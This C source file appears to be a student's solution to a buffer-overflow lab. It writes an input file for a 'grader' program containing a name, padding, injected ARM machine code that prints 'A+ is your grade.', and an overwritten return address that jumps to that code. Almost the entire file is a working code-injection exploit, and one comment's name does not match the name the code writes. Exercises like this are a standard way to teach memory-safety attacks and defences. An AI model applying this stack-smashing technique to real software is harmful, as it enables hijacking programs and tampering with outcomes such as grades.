#include <stdio.h>
#include "miniassembler.h"

/* this program creates a file named "dataAplus" to be used as input to grader */
/* this files contains the name James and then our assembly code to give us a A+ grade */
/* then it fills the rest of the buffer with exclamation marks */
/* then it overwrites the return address with the start of our assembly code */

int main(void) {
    int i;
    unsigned int instruction[3];
    FILE *fp = fopen("dataAplus", "w");
    
    /* putting in the name Ehsan*/
    fputc('J', fp);
    fputc('a', fp);
    fputc('m', fp);
    fputc('e', fp);
    fputc('s', fp);
    fputc('\0', fp);

    /* putting in two buffers so instructions are even */
    fputc('!', fp);
    fputc('!', fp);

    /* making our machine code*/
    instruction[0] = MiniAssembler_adr(0, 0x42006c, 0x420060);
    instruction[1] = MiniAssembler_bl(0x400670, 0x420064);
    instruction[2] = MiniAssembler_b(0x4008b0, 0x420068);
    
    /* writing our machine code to the file */
    for (i = 0; i < 3; i++) {
        fwrite(&instruction[i], sizeof(unsigned int), 1, fp);
    }
    /* putting the string "A+ is your grade.\n"  in memory this is 19 bytes*/
    fputs("A+ is your grade.", fp);
    fputc('\0', fp);

    /* filling the rest of the buffer with exclamation marks */
    for (i = 0; i < 9; i++) {
        fputc('!', fp);
    }
/* overwriting the return address with 0x420060, the start of our assembly code */
    fputc(0x60, fp);
    fputc(0x00, fp);
    fputc(0x42, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    
    
    fclose(fp);
    return 0;
}